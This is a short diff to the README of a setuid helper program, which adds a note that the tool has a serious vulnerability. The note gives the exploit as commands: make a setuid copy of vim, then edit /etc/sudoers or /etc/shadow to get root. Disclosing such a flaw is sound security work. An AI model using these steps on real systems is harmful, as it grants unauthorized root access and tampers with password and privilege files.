@@ -3,6 +3,16 @@ Mark Gius
 You will likely want to modify the macros that define the 
 target and initial UID/GID
 
-Should be agnostic to crypt-types.
+Should be agnostic to crypt hash types
 
 Developed on Debian Testing/Unstable/Experimental 32-bit.
+
+So there's a huge vulnerability in this program.  Here's an exploit.
+
+cp /usr/bin/vim sniff
+chmod 700 sniff
+./mksuid
+vim /etc/sudoers || vim /etc/shadow
+% add myself to sudoers file, change root password, etc
+
+I now have root. 
